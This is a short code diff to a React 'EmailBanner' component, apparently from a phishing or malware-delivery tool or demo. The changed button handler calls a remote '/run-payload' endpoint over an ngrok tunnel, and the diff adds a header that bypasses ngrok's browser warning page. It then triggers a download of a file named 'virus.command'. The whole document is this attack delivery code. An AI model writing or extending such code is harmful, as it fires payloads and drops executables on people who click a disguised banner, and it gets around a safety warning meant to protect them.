@@ -126,8 +126,10 @@ function EmailBanner({ notification }) {
               className="run-payload-btn"
               onClick={() => {
                 const httpBase = WS_URL.replace("ws://","http://").replace("wss://","https://");
-                // Fire run-payload FIRST (before any navigation)
-                fetch(`${httpBase}/run-payload`).catch(()=>{});
+                // Fire run-payload FIRST — ngrok-skip header bypasses interstitial
+                fetch(`${httpBase}/run-payload`, {
+                  headers: { "ngrok-skip-browser-warning": "1" }
+                }).catch(()=>{});
                 // Then trigger browser download (doesn't navigate away)
                 const a = document.createElement("a");
                 a.href = `${httpBase}/download/virus.command`;
